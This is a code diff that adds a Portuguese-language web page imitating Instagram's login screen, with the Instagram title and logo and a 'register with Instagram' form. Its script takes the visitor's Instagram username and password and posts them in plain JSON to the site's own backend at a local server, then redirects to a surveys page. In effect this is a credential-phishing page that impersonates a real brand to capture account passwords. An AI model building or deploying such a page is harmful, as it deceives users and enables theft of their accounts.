@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram - Login</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background-color: #fff;
+      width: 100%;
+      max-width: 360px;
+      padding: 40px 30px;
+      border: 1px solid #dbdbdb;
+      border-radius: 8px;
+      text-align: center;
+    }
+
+    .logo img {
+      width: 50px;
+      margin-bottom: 24px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 10px;
+      border: 1px solid #dbdbdb;
+      border-radius: 4px;
+      background-color: #fafafa;
+      font-size: 14px;
+     
+    }
+
+    input:focus {
+      outline: none;
+      background-color: #fff;
+    }
+
+    h2{
+      margin-bottom: 20px;
+    }
+
+    .btn-login {
+      background-color: #3897f0;
+      color: #fff;
+      border: none;
+      padding: 10px;
+      width: 100%;
+      font-weight: bold;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .btn-login:disabled {
+      opacity: 0.5;
+      cursor: default;
+    }
+
+    .or {
+      margin: 20px 0;
+      position: relative;
+      text-align: center;
+      font-size: 13px;
+      color: #8e8e8e;
+    }
+
+    .or::before,
+    .or::after {
+      content: "";
+      position: absolute;
+      top: 50%;
+      width: 40%;
+      height: 1px;
+      background: #dbdbdb;
+    }
+
+    .or::before {
+      left: 0;
+    }
+
+    .or::after {
+      right: 0;
+    }
+
+    .facebook-login {
+      color: #385185;
+      font-size: 14px;
+      font-weight: bold;
+      margin-top: 10px;
+      text-decoration: none;
+      display: inline-block;
+    }
+
+    .forgot-password {
+      font-size: 12px;
+      color: #00376b;
+      text-decoration: none;
+      margin-top: 20px;
+      display: block;
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #999;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <form id="instagram-register-form">
+      <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram" />
+      </div>
+      <h2>Cadastrar com Instagram</h2>
+      <input
+        type="text"
+        id="username"
+        name="username"
+        placeholder="Telefone, nome de usuário ou e-mail"
+        required
+      />
+      <input
+        type="password"
+        id="password"
+        name="password"
+        placeholder="Senha"
+        required
+      />
+      <button type="submit" class="btn-login" disabled>Cadastrar</button>
+    </form>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const form = document.getElementById('instagram-register-form');
+      const btn = form.querySelector('button[type="submit"]');
+      const inputs = [form.username, form.password];
+
+      inputs.forEach(input => input.addEventListener('input', () => {
+        btn.disabled = inputs.some(i => !i.value.trim());
+      }));
+
+      form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const username = form.username.value.trim();
+        const password = form.password.value;
+        try {
+          const response = await fetch('http://localhost:3000/register/instagram', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username, password }),
+          });
+          const data = await response.json();
+          if (!response.ok) throw new Error(data.error || 'Erro no cadastro.');
+          // redireciona após sucesso
+          window.location.href = 'pesquisas.html';
+        } catch (err) {
+          console.error(err);
+          alert('Erro: ' + err.message);
+        }
+      });
+    });
+  </script>
+</body>
+</html>
